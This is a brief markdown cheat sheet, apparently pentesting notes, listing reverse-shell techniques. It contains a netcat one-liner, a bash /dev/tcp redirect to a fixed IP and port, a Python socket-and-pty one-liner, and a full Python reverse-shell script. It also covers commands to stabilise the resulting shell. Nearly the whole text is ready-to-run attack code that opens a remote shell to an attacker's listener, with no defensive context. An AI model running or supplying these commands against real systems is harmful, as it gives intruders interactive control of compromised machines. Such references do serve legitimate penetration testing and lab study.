# Reverse Shells

## One line bash

```bash
# Reverse shell with netcat
nc TARGET PORT -e /bin/bash

# Reverse shell with /dev
bash -i >& /dev/tcp/192.168.1.7/6666 0>&1

# Reverse shell with python3
export RHOST="target.local";export RPORT=3000; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Stabilize shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

## Python code

```python
import socket,os,pty

RHOST="target.local"
RPORT=3000

s=socket.socket()
s.connect((RHOST,int(RPORT)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```